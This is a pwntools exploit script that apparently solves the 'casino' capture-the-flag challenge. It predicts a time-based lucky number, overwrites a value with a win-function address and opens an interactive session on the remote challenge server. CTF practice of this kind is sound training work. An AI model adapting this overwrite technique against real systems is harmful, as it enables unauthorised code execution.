#!/usr/bin/env python3
from pwn import *
import time
import random
from decimal import Decimal

# context.terminal = ['tmux', 'splitw', '-h']
# io = process('./casino')
io = remote('isc2023.1337.cx', 10100)

# gdb.attach(io, '''
#     b *0x08048704
#     c
# ''')

def recvlines(n):
    for _ in range(n):
        io.recvline()

# print(int(time.time()))
result = subprocess.run("./get_lucky_number", capture_output=True)
recvlines(2)
lucky_number = result.stdout.decode('utf-8')
# print(lucky_number)
io.sendline("south park")
recvlines(4)
for _ in range(46): # 42 + 4
    io.sendline('1')
io.sendline('134514406') # win func address as unsigned int
io.sendline('3735928559') # 0xdeadbeef
io.sendline(lucky_number)
io.sendline('#') # non-integer to end while
io.sendline('n') # dont wanna continue
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.interactive()
